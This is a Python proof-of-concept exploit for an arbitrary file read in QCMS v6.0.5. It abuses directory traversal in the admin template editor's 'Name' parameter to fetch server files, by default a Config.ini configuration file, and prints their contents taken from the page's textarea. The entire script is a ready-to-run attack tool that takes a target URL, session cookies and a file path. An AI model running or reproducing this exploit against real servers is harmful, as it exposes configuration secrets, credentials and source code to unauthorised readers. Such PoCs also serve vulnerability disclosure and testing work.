"""
QCMS v6.0.5 Arbitrary File Read Proof of Concept
Author: xiaoyang

This script exploits a directory traversal vulnerability in QCMS's template editor
to read arbitrary files on the server. The file content is rendered inside a <textarea>
with ID "Input_Html", even if it's a PHP file or contains special characters.

Requirements:
- Authenticated session (login manually and pass session cookies via --cookie)
"""

import requests
import argparse
import re


parser = argparse.ArgumentParser(description="QCMS v6.0.5 Arbitrary File Read Exploit")
parser.add_argument('--url', help='Target base URL (e.g., http://127.0.0.1)', required=True)
parser.add_argument('--cookie', help='Authenticated session cookies (quoted)', required=True)
parser.add_argument('--file', help='Target file path to read', default='../../Lib/Config/Config.ini')
args = parser.parse_args()


target_url = args.url.rstrip('/') + "/admin/templates/edit.html"
params = {"Name": args.file}
headers = {
    "User-Agent": "Mozilla/5.0",
    "Cookie": args.cookie
}

print(f"[*] Sending file read request to: {target_url}")
response = requests.get(target_url, params=params, headers=headers)
html = response.text


match = re.search(r'<textarea[^>]*id=["\']Input_Html["\'][^>]*>(.*?)</textarea>', html, re.DOTALL | re.IGNORECASE)

if match:
    file_content = match.group(1)
    print(f"\n[+] Successfully extracted file: {args.file}\n")
    print("==== File Content Start ====\n")
    print(file_content)
    print("\n==== File Content End ====")
else:
    print("[-] Failed to locate target <textarea>. File may not exist or access is restricted.")
    print("==== Response Preview (first 1000 chars) ====")
    print(html[:3000])
